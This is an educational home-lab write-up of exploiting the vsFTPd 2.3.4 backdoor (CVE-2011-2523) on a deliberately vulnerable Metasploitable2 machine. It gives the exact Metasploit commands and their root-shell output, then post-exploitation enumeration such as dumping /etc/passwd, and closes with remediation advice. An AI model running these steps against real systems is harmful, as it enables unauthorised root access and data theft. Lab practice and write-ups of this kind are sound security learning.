# CVE-2011-2523: vsFTPd 2.3.4 Backdoor â€” Exploit Writeup

**Author:** Mahembajr  
**Date:** February 17, 2026  
**Target:** Metasploitable2 (192.168.11.132) â€” Home Lab  
**Attacker:** Kali Linux (192.168.11.131)  
**Severity:** ğŸ”´ CRITICAL (CVSS 10.0)  

---

## ğŸ“‹ Executive Summary

During a port scan of my home lab target (Metasploitable2), my custom Python port scanner identified an FTP service running vsFTPd version 2.3.4 on port 21. Research revealed this version contains a deliberate backdoor (CVE-2011-2523) planted by an unknown attacker who compromised the vsFTPd source code repository in 2011. Exploitation of this backdoor resulted in an unauthenticated root shell on the target machine, granting full system access.

---

## ğŸ” Phase 1 â€” Reconnaissance

### Port Scan
Using my custom Python port scanner I identified the following open ports on the target:

```
Target   : 192.168.11.132
Ports    : 1 - 1024
Threads  : 100

[OPEN]  Port    21  FTP      â†’ 220 (vsFTPd 2.3.4)
[OPEN]  Port    22  SSH      â†’ SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
[OPEN]  Port    23  Telnet   â†’ (plaintext remote access)
[OPEN]  Port    25  SMTP     â†’ 220 metasploitable.localdomain ESMTP Postfix
[OPEN]  Port    53  DNS
[OPEN]  Port    80  HTTP     â†’ HTTP/1.1 200 OK
[OPEN]  Port   111  RPC
[OPEN]  Port   139  NetBIOS
[OPEN]  Port   445  SMB
[OPEN]  Port   512  rexec    â†’ Where are you?
[OPEN]  Port   513  rlogin
[OPEN]  Port   514  rsh

SCAN COMPLETE in 2.21 seconds â€” 12 open ports found
```

### Key Finding
The banner on port 21 revealed **vsFTPd 2.3.4** â€” a version with a publicly known critical backdoor. The banner grab was performed automatically by my scanner's `grab_banner()` function, which sent an HTTP HEAD request and read the service response.

---

## ğŸ“– Vulnerability Analysis

### What is CVE-2011-2523?

| Field | Details |
|---|---|
| **CVE ID** | CVE-2011-2523 |
| **Affected Software** | vsFTPd (Very Secure FTP Daemon) version 2.3.4 |
| **Vulnerability Type** | Backdoor / Unauthenticated Remote Code Execution |
| **CVSS Score** | 10.0 (Critical) |
| **Disclosed** | July 3, 2011 |
| **Patch Available** | Yes â€” upgrade to 2.3.5 or later |

### Background
vsFTPd is a widely used FTP server for Unix/Linux systems. In July 2011, it was discovered that an unknown attacker had compromised the vsFTPd download server and replaced the legitimate vsFTPd 2.3.4 source code with a trojaned version containing a backdoor.

### How the Backdoor Works
The backdoor is triggered by a specific pattern in the FTP username field:

1. A client connects to port 21 (FTP)
2. The client sends a username containing `:)` (a smiley face) anywhere in the string
3. The backdoored code detects this pattern
4. It spawns a **root shell listener on port 6200**
5. Any client connecting to port 6200 gets an unauthenticated root shell

```
Attacker                    vsFTPd 2.3.4
    â”‚                            â”‚
    â”‚â”€â”€ USER anyname:)  â”€â”€â”€â”€â”€â”€â”€â”€>â”‚
    â”‚                            â”‚ (backdoor triggered)
    â”‚                            â”‚ (opens port 6200)
    â”‚<â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 6200 listening â”€â”€
    â”‚
    â”‚â”€â”€ connect to port 6200 â”€â”€â”€>â”‚
    â”‚<â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ root shell â”‚
    â”‚
    â”‚   whoami â†’ root            â”‚
```

### Why This Is Dangerous
- **No authentication required** â€” any unauthenticated user can trigger it
- **Instant root access** â€” highest privilege level on the system
- **Remote exploitation** â€” works over any network connection
- **Simple trigger** â€” just a smiley face in the username

---

## âš”ï¸ Phase 2 â€” Exploitation

### Environment
```
Attacker : Kali Linux  â€” 192.168.11.131
Target   : Metasploitable2 â€” 192.168.11.132
Tool     : Metasploit Framework (msfconsole)
Module   : exploit/unix/ftp/vsftpd_234_backdoor
```

### Exploitation Steps

**Step 1 â€” Launch Metasploit:**
```bash
msfconsole
```

**Step 2 â€” Load the exploit module:**
```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
```

**Step 3 â€” Configure the target:**
```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.11.132
RHOSTS => 192.168.11.132
```

**Step 4 â€” Execute:**
```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
```

### Exploitation Output
```
[*] 192.168.11.132:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.11.132:21 - USER: 331 Please specify the password.
[+] 192.168.11.132:21 - Backdoor service has been spawned, handling...
[+] 192.168.11.132:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened
    (192.168.11.131:39579 -> 192.168.11.132:6200)
```

---

## ğŸ’¥ Phase 3 â€” Post-Exploitation

With root access established, I performed standard post-exploitation enumeration:

### System Information
```bash
hostname && uname -a
```
```
metasploitable
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```
**Finding:** Kernel version 2.6.24 from 2008 â€” over 18 years out of date with hundreds of known CVEs.

### Privilege Confirmation
```bash
whoami && id
```
```
root
uid=0(root) gid=0(root)
```
**Finding:** Full root access confirmed. Complete control over the system.

### User Enumeration
```bash
cat /etc/passwd
```
**Key accounts discovered:**

| Username | Service | Risk |
|---|---|---|
| `msfadmin` | Main admin | Primary target account |
| `postgres` | PostgreSQL DB | Database access |
| `mysql` | MySQL DB | Database access |
| `tomcat55` | Apache Tomcat | Web app server |
| `www-data` | Apache HTTP | Web server |
| `user` | Regular user | Lateral movement target |
| `service` | Service account | Lateral movement target |

### Files in /root
```bash
ls /root
```
```
Desktop
reset_logs.sh
vnc.log
```
**Finding:** `vnc.log` confirms VNC remote desktop service is running â€” another potential attack vector. `reset_logs.sh` is a log-clearing script â€” relevant for understanding how to cover tracks (for defensive awareness).

---

## ğŸ›¡ï¸ Remediation Recommendations

If this were a real engagement, I would recommend the following to the system owner:

**Immediate Actions:**
1. **Remove vsFTPd 2.3.4** and upgrade to the latest version (3.0.5+)
2. **Disable Telnet** (port 23) â€” replace with SSH entirely
3. **Disable R-services** (ports 512, 513, 514) â€” these have no place on modern systems
4. **Update the kernel** â€” Linux 2.6.24 from 2008 has hundreds of unpatched CVEs
5. **Change default credentials** â€” msfadmin/msfadmin is publicly known

**Short-term Actions:**
6. **Implement a firewall** â€” restrict which ports are exposed to the network
7. **Audit all running services** â€” 12 open ports is an extremely large attack surface
8. **Update all software** â€” OpenSSH 4.7, Postfix, Samba all have known vulnerabilities

**Long-term Actions:**
9. **Implement intrusion detection** (Snort/Suricata) to detect port scans
10. **Set up log monitoring** â€” centralized logging so reset_logs.sh can't hide activity
11. **Regular vulnerability scanning** â€” schedule monthly scans with OpenVAS

---

## ğŸ“š What I Learned

**Supply chain attacks are real.** CVE-2011-2523 wasn't a coding mistake â€” it was a deliberate attack on the software distribution pipeline. The attacker didn't exploit vsFTPd, they *became* vsFTPd by compromising the download server. This is the same category of attack as the 2020 SolarWinds breach that compromised thousands of organizations.

**Banner grabbing is powerful.** My port scanner identified the exact vulnerable version (`vsFTPd 2.3.4`) from the service banner in milliseconds. Without that version number I wouldn't have known which CVE to research. This shows why organizations should suppress or obfuscate service banners in production.

**Recon â†’ Research â†’ Exploit is the real workflow.** The scan took 2.21 seconds. The research took 2 minutes (search CVE database). The exploit took 30 seconds. The entire attack chain from zero to root took under 5 minutes â€” on a machine that's been sitting unpatched since 2008.

---

## ğŸ—ºï¸ Attack Chain Summary

```
[RECON]
Python port scanner â†’ port 21 open â†’ vsFTPd 2.3.4 banner
        â†“
[RESEARCH]  
CVE-2011-2523 â†’ backdoor triggered by :) in username â†’ opens port 6200
        â†“
[EXPLOITATION]
Metasploit module â†’ sends USER backdoor:) â†’ port 6200 spawned
        â†“
[POST-EXPLOITATION]
Root shell â†’ /etc/passwd dumped â†’ 20+ users enumerated
â†’ Kernel 2.6.24 identified â†’ MySQL/PostgreSQL/Tomcat discovered
        â†“
[IMPACT]
Full system compromise â€” all data accessible, 
all services controllable, persistence achievable
```

---

## ğŸ”— References

- [CVE-2011-2523 â€” NVD](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [Metasploit Module â€” vsftpd_234_backdoor](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)
- [vsFTPd Official Site](https://security.appspot.com/vsftpd.html)
- [Metasploitable2 Documentation](https://docs.rapid7.com/metasploit/metasploitable-2/)

---

*This exploit was performed in a controlled, isolated home lab environment on a deliberately vulnerable machine (Metasploitable2) for educational purposes. All techniques documented here should only be used on systems you own or have explicit written permission to test.*
